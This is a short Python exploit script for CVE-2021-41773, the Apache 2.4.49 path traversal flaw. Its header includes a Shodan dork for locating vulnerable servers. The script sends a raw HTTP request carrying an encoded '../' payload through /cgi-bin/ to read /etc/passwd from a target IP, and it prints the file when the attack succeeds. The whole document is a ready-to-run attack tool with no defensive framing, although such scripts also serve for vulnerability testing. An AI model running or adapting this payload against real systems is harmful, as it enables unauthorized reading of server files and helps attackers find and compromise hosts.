#!/usr/bin/python

# Exploit Title: Apache/2.4.49
# Shodan Dork: Server: Apache/2.4.49
# Date: 11-11-2021
# Exploit Author: Onavty
# Software Link: http://archive.apache.org/dist/httpd/httpd-2.4.49.tar.bz2
# Version: 2.4.49
# Tested on: Ubuntu 20.04 LTS
# CVE : 2021-41773



from sys import argv, exit

if (len(argv)) != 2:
    print('\033[1;32;40m Usage : python Apache-2.4.49.py IP')
    print('\033[1;32;40m Exemple : python Apache-2.4.49.py 10.0.1.10')
    exit()

ip = argv[1]
payload = "/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

def exploit(ip):
    from socket import socket,AF_INET,SOCK_STREAM
    s = socket(AF_INET, SOCK_STREAM)                 
    s.connect((ip , 80))
    s.sendall("GET {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0\r\n\r\n".format(payload,ip).encode())
    response = s.recv(4096).decode()
    
    if "root:x" in response or ("500 Internal Server Error" in response):
        print('\033[1;32;40m \n\n\t\tThis Apache Installation  Is Vulnerable To LFI')
        print('\033[1;32;40m \t\tPayload Used : ', payload,'\n\n')
        print('------------------------------------')
        print(response)
        print('------------------------------------')
    else :
        print('\033[1;31;40m Not Vulnerable')
    s.close

if __name__ == "__main__":
    exploit(ip)
